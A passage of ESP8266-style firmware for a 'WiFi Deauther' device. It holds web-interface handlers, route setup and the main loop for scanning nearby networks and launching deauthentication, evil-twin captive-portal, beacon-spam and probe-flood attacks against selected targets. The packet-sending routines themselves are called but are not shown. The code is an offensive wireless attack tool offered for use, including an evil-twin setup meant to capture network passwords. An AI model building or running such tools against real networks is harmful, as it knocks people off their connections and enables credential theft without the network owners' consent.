  html += ".btn-scan { background-color: #1f6feb; }";
  html += ".btn-back { background-color: #f85149; }";
  html += ".ap-list { margin-top: 15px; }";
  html += ".ap-item { padding: 10px; border-bottom: 1px solid #30363d; display: flex; justify-content: space-between; align-items: center; }";
  html += ".ap-item:hover { background-color: #1f2938; }";
  html += ".selected { background-color: #1f2938; }";
  html += ".rssi { color: #3fb950; }";
  html += ".channel { color: #a5d6ff; }";
  html += "</style></head><body>";
  html += "<div class='header'><h1>Network Scan</h1></div>";
  
  html += "<div class='container'>";
  html += "<div class='card'>";
  
  if (apCount == 0) {
    html += "<p>No networks found. Scan again?</p>";
  } else {
    html += "<p>Found " + String(apCount) + " networks:</p>";
    html += "<div class='ap-list'>";
    
    for (uint8_t i = 0; i < apCount; i++) {
      String itemClass = "ap-item";
      if (accessPoints[i].selected) itemClass += " selected";
      
      html += "<div class='" + itemClass + "'>";
      html += "<div>";
      html += "<strong>" + accessPoints[i].ssid + "</strong><br>";
      html += "<small>" + accessPoints[i].bssid + "</small>";
      html += "</div>";
      html += "<div style='text-align: right;'>";
      html += "<span class='rssi'>" + String(accessPoints[i].rssi) + " dBm</span><br>";
      html += "<span class='channel'>CH " + String(accessPoints[i].channel) + "</span>";
      html += "</div>";
      html += "</div>";
    }
    
    html += "</div>";
  }
  
  html += "<a href='/scan?rescan=1' class='btn btn-scan'>Rescan Networks</a>";
  html += "<a href='/' class='btn btn-back'>Back to Dashboard</a>";
  html += "</div>";
  html += "</div></body></html>";
  
  webServer.send(200, "text/html", html);
  
  if (webServer.hasArg("rescan")) {
    scanNetworks();
  }
}

void handleDeauth() {
  if (currentAttack != ATTACK_OFF) {
    webServer.sendHeader("Location", "/");
    webServer.send(303);
    return;
  }
  
  String html = "<!DOCTYPE html><html><head>";
  html += "<title>Deauth Attack - WiFi Deauther v" VERSION "</title>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<style>";
  html += "body { font-family: 'Courier New', monospace; margin: 0; padding: 0; background-color: #0d1117; color: #c9d1d9; }";
  html += ".container { max-width: 800px; margin: 0 auto; padding: 20px; }";
  html += ".header { background-color: #161b22; color: #58a6ff; padding: 15px; text-align: center; margin-bottom: 20px; border-bottom: 1px solid #58a6ff; }";
  html += ".card { background-color: #161b22; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.3); padding: 20px; margin-bottom: 20px; border: 1px solid #30363d; }";
  html += ".btn { display: inline-block; padding: 10px 15px; background-color: #58a6ff; color: white; text-decoration: none; border-radius: 4px; margin-right: 10px; border: none; cursor: pointer; font-family: 'Courier New', monospace; }";
  html += ".btn-start { background-color: #f85149; }";
  html += ".btn-back { background-color: #6e7681; }";
  html += ".form-group { margin-bottom: 15px; }";
  html += "label { display: block; margin-bottom: 5px; font-weight: bold; }";
  html += "select, input { width: 100%; padding: 8px; background-color: #0d1117; border: 1px solid #30363d; border-radius: 4px; box-sizing: border-box; color: #c9d1d9; }";
  html += ".checkbox { display: flex; align-items: center; margin-bottom: 10px; }";
  html += ".checkbox input { width: auto; margin-right: 10px; }";
  html += "</style></head><body>";
  html += "<div class='header'><h1>Deauth Attack</h1></div>";
  
  html += "<div class='container'>";
  html += "<div class='card'>";
  html += "<form action='/startdeauth' method='POST'>";
  
  html += "<div class='form-group'>";
  html += "<label>Select Target Networks:</label>";
  
  if (apCount == 0) {
    html += "<p>No networks found. Please scan first.</p>";
  } else {
    for (uint8_t i = 0; i < apCount; i++) {
      String checked = accessPoints[i].selected ? "checked" : "";
      html += "<div class='checkbox'>";
      html += "<input type='checkbox' id='ap" + String(i) + "' name='ap" + String(i) + "' " + checked + ">";
      html += "<label for='ap" + String(i) + "'>" + accessPoints[i].ssid + " (" + accessPoints[i].bssid + ")</label>";
      html += "</div>";
    }
  }
  
  html += "</div>";
  
  html += "<div class='form-group'>";
  html += "<label>Channel Hop Interval (ms):</label>";
  html += "<input type='number' name='interval' value='200' min='100' max='1000'>";
  html += "</div>";
  
  html += "<div class='form-group'>";
  html += "<label>Packet Count (0 = unlimited):</label>";
  html += "<input type='number' name='count' value='0' min='0'>";
  html += "</div>";
  
  html += "<button type='submit' class='btn btn-start'>Start Deauth Attack</button>";
  html += "<a href='/' class='btn btn-back'>Cancel</a>";
  html += "</form>";
  html += "</div>";
  html += "</div></body></html>";
  
  webServer.send(200, "text/html", html);
}

void handleStartDeauth() {
  if (currentAttack != ATTACK_OFF) {
    webServer.sendHeader("Location", "/");
    webServer.send(303);
    return;
  }
  
  // Update selected networks
  for (uint8_t i = 0; i < apCount; i++) {
    accessPoints[i].selected = webServer.hasArg("ap" + String(i));
  }
  
  if (countSelectedNetworks() > 0) {
    startAttack(ATTACK_DEAUTH);
  }
  
  webServer.sendHeader("Location", "/");
  webServer.send(303);
}

void handleEvilTwinSetup() {
  if (currentAttack != ATTACK_OFF) {
    webServer.sendHeader("Location", "/");
    webServer.send(303);
    return;
  }
  
  String html = "<!DOCTYPE html><html><head>";
  html += "<title>Evil Twin - WiFi Deauther v" VERSION "</title>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<style>";
  html += "body { font-family: 'Courier New', monospace; margin: 0; padding: 0; background-color: #0d1117; color: #c9d1d9; }";
  html += ".container { max-width: 800px; margin: 0 auto; padding: 20px; }";
  html += ".header { background-color: #161b22; color: #58a6ff; padding: 15px; text-align: center; margin-bottom: 20px; border-bottom: 1px solid #58a6ff; }";
  html += ".card { background-color: #161b22; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.3); padding: 20px; margin-bottom: 20px; border: 1px solid #30363d; }";
  html += ".btn { display: inline-block; padding: 10px 15px; background-color: #58a6ff; color: white; text-decoration: none; border-radius: 4px; margin-right: 10px; border: none; cursor: pointer; font-family: 'Courier New', monospace; }";
  html += ".btn-start { background-color: #d29922; }";
  html += ".btn-back { background-color: #6e7681; }";
  html += ".form-group { margin-bottom: 15px; }";
  html += "label { display: block; margin-bottom: 5px; font-weight: bold; }";
  html += "select, input { width: 100%; padding: 8px; background-color: #0d1117; border: 1px solid #30363d; border-radius: 4px; box-sizing: border-box; color: #c9d1d9; }";
  html += "</style></head><body>";
  html += "<div class='header'><h1>Evil Twin Attack</h1></div>";
  
  html += "<div class='container'>";
  html += "<div class='card'>";
  html += "<form action='/starteviltwin' method='POST'>";
  
  html += "<div class='form-group'>";
  html += "<label>Select Target Network:</label>";
  html += "<select name='target'>";
  
  if (apCount == 0) {
    html += "<option value=''>No networks found</option>";
  } else {
    for (uint8_t i = 0; i < apCount; i++) {
      String selected = accessPoints[i].selected ? "selected" : "";
      html += "<option value='" + String(i) + "' " + selected + ">" + accessPoints[i].ssid + " (" + accessPoints[i].bssid + ")</option>";
    }
  }
  
  html += "</select>";
  html += "</div>";
  
  html += "<div class='form-group'>";
  html += "<label>Password (for captive portal):</label>";
  html += "<input type='text' name='password' value='" + evilTwinPassword + "'>";
  html += "</div>";
  
  html += "<button type='submit' class='btn btn-start'>Start Evil Twin</button>";
  html += "<a href='/' class='btn btn-back'>Cancel</a>";
  html += "</form>";
  html += "</div>";
  html += "</div></body></html>";
  
  webServer.send(200, "text/html", html);
}

void handleStartEvilTwin() {
  if (currentAttack != ATTACK_OFF) {
    webServer.sendHeader("Location", "/");
    webServer.send(303);
    return;
  }
  
  if (webServer.hasArg("target") && apCount > 0) {
    uint8_t target = webServer.arg("target").toInt();
    if (target < apCount) {
      evilTwinSSID = accessPoints[target].ssid;
      accessPoints[target].selected = true;
      
      if (webServer.hasArg("password")) {
        evilTwinPassword = webServer.arg("password");
      }
      
      startAttack(ATTACK_EVIL_TWIN);
    }
  }
  
  webServer.sendHeader("Location", "/");
  webServer.send(303);
}

void handleBeacon() {
  if (currentAttack != ATTACK_OFF) {
    webServer.sendHeader("Location", "/");
    webServer.send(303);
    return;
  }
  
  String html = "<!DOCTYPE html><html><head>";
  html += "<title>Beacon Spam - WiFi Deauther v" VERSION "</title>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<style>";
  html += "body { font-family: 'Courier New', monospace; margin: 0; padding: 0; background-color: #0d1117; color: #c9d1d9; }";
  html += ".container { max-width: 800px; margin: 0 auto; padding: 20px; }";
  html += ".header { background-color: #161b22; color: #58a6ff; padding: 15px; text-align: center; margin-bottom: 20px; border-bottom: 1px solid #58a6ff; }";
  html += ".card { background-color: #161b22; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.3); padding: 20px; margin-bottom: 20px; border: 1px solid #30363d; }";
  html += ".btn { display: inline-block; padding: 10px 15px; background-color: #58a6ff; color: white; text-decoration: none; border-radius: 4px; margin-right: 10px; border: none; cursor: pointer; font-family: 'Courier New', monospace; }";
  html += ".btn-start { background-color: #1f6feb; }";
  html += ".btn-back { background-color: #6e7681; }";
  html += ".form-group { margin-bottom: 15px; }";
  html += "label { display: block; margin-bottom: 5px; font-weight: bold; }";
  html += "select, input { width: 100%; padding: 8px; background-color: #0d1117; border: 1px solid #30363d; border-radius: 4px; box-sizing: border-box; color: #c9d1d9; }";
  html += "</style></head><body>";
  html += "<div class='header'><h1>Beacon Spam Attack</h1></div>";
  
  html += "<div class='container'>";
  html += "<div class='card'>";
  html += "<form action='/startbeacon' method='POST'>";
  
  html += "<div class='form-group'>";
  html += "<label>SSID List:</label>";
  html += "<select name='ssids' multiple size='5' style='height: 120px;'>";
  
  for (uint8_t i = 0; i < ssidCount; i++) {
    html += "<option value='" + String(i) + "' selected>" + beaconSSIDs[i] + "</option>";
  }
  
  html += "</select>";
  html += "</div>";
  
  html += "<div class='form-group'>";
  html += "<label>Packet Interval (ms):</label>";
  html += "<input type='number' name='interval' value='50' min='10' max='1000'>";
  html += "</div>";
  
  html += "<div class='form-group'>";
  html += "<label>Channel Hop:</label>";
  html += "<select name='channelhop'>";
  html += "<option value='1' selected>Enabled</option>";
  html += "<option value='0'>Disabled</option>";
  html += "</select>";
  html += "</div>";
  
  html += "<button type='submit' class='btn btn-start'>Start Beacon Spam</button>";
  html += "<a href='/' class='btn btn-back'>Cancel</a>";
  html += "</form>";
  html += "</div>";
  html += "</div></body></html>";
  
  webServer.send(200, "text/html", html);
}

void handleStartBeacon() {
  if (currentAttack != ATTACK_OFF) {
    webServer.sendHeader("Location", "/");
    webServer.send(303);
    return;
  }
  
  startAttack(ATTACK_BEACON);
  
  webServer.sendHeader("Location", "/");
  webServer.send(303);
}

void handleProbe() {
  if (currentAttack != ATTACK_OFF) {
    webServer.sendHeader("Location", "/");
    webServer.send(303);
    return;
  }
  
  String html = "<!DOCTYPE html><html><head>";
  html += "<title>Probe Flood - WiFi Deauther v" VERSION "</title>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<style>";
  html += "body { font-family: 'Courier New', monospace; margin: 0; padding: 0; background-color: #0d1117; color: #c9d1d9; }";
  html += ".container { max-width: 800px; margin: 0 auto; padding: 20px; }";
  html += ".header { background-color: #161b22; color: #58a6ff; padding: 15px; text-align: center; margin-bottom: 20px; border-bottom: 1px solid #58a6ff; }";
  html += ".card { background-color: #161b22; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.3); padding: 20px; margin-bottom: 20px; border: 1px solid #30363d; }";
  html += ".btn { display: inline-block; padding: 10px 15px; background-color: #58a6ff; color: white; text-decoration: none; border-radius: 4px; margin-right: 10px; border: none; cursor: pointer; font-family: 'Courier New', monospace; }";
  html += ".btn-start { background-color: #a371f7; }";
  html += ".btn-back { background-color: #6e7681; }";
  html += ".form-group { margin-bottom: 15px; }";
  html += "label { display: block; margin-bottom: 5px; font-weight: bold; }";
  html += "select, input { width: 100%; padding: 8px; background-color: #0d1117; border: 1px solid #30363d; border-radius: 4px; box-sizing: border-box; color: #c9d1d9; }";
  html += "</style></head><body>";
  html += "<div class='header'><h1>Probe Flood Attack</h1></div>";
  
  html += "<div class='container'>";
  html += "<div class='card'>";
  html += "<form action='/startprobe' method='POST'>";
  
  html += "<div class='form-group'>";
  html += "<label>SSID List:</label>";
  html += "<select name='ssids' multiple size='5' style='height: 120px;'>";
  
  for (uint8_t i = 0; i < ssidCount; i++) {
    html += "<option value='" + String(i) + "' selected>" + beaconSSIDs[i] + "</option>";
  }
  
  html += "</select>";
  html += "</div>";
  
  html += "<div class='form-group'>";
  html += "<label>Packet Interval (ms):</label>";
  html += "<input type='number' name='interval' value='50' min='10' max='1000'>";
  html += "</div>";
  
  html += "<div class='form-group'>";
  html += "<label>Channel Hop:</label>";
  html += "<select name='channelhop'>";
  html += "<option value='1' selected>Enabled</option>";
  html += "<option value='0'>Disabled</option>";
  html += "</select>";
  html += "</div>";
  
  html += "<button type='submit' class='btn btn-start'>Start Probe Flood</button>";
  html += "<a href='/' class='btn btn-back'>Cancel</a>";
  html += "</form>";
  html += "</div>";
  html += "</div></body></html>";
  
  webServer.send(200, "text/html", html);
}

void handleStartProbe() {
  if (currentAttack != ATTACK_OFF) {
    webServer.sendHeader("Location", "/");
    webServer.send(303);
    return;
  }
  
  startAttack(ATTACK_PROBE);
  
  webServer.sendHeader("Location", "/");
  webServer.send(303);
}

void handleStop() {
  stopAttack();
  webServer.sendHeader("Location", "/");
  webServer.send(303);
}

void initWebServer() {
  webServer.on("/", handleRoot);
  webServer.on("/scan", handleScan);
  webServer.on("/deauth", handleDeauth);
  webServer.on("/startdeauth", handleStartDeauth);
  webServer.on("/eviltwin", handleEvilTwinSetup);
  webServer.on("/starteviltwin", handleStartEvilTwin);
  webServer.on("/beacon", handleBeacon);
  webServer.on("/startbeacon", handleStartBeacon);
  webServer.on("/probe", handleProbe);
  webServer.on("/startprobe", handleStartProbe);
  webServer.on("/stop", handleStop);
  webServer.onNotFound([]() {
    webServer.sendHeader("Location", "/");
    webServer.send(303);
  });
  
  webServer.begin();
}

void setup() {
  Serial.begin(115200);
  
  // Initialize components
  initDisplay();
  initButtons();
  initWiFi();
  initWebServer();
  
  // Set initial time
  setTime(12, 0, 0, 1, 1, 2023);
  
  // Configure LED
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);
  
  // Show welcome screen
  display.clear();
  display.drawString(0, 0, "WiFi Deauther v" VERSION);
  display.drawString(0, 24, "Initializing...");
  display.display();
  
  delay(1000);
}

void loop() {
  static uint32_t lastChannelHop = 0;
  static uint32_t lastUpdate = 0;
  
  // Update current time
  currentTime = now();
  
  // Handle button presses
  handleButtons();
  
  // Handle web server requests
  webServer.handleClient();
  dnsServer.processNextRequest();
  
  // Channel hopping
  if (channelHop && millis() - lastChannelHop > CHANNEL_HOP_INTERVAL) {
    lastChannelHop = millis();
    currentChannel = (currentChannel % 13) + 1;
    wifi_set_channel(currentChannel);
  }
  
  // Execute current attack
  executeAttack();
  
  // Auto-scan if no networks found
  if (apCount == 0 && millis() - lastScanTime > SCAN_INTERVAL) {
    scanNetworks();
  }
  
  // Update display periodically
  if (millis() - lastUpdate > 100) {
    lastUpdate = millis();
    updateDisplay();
  }
}
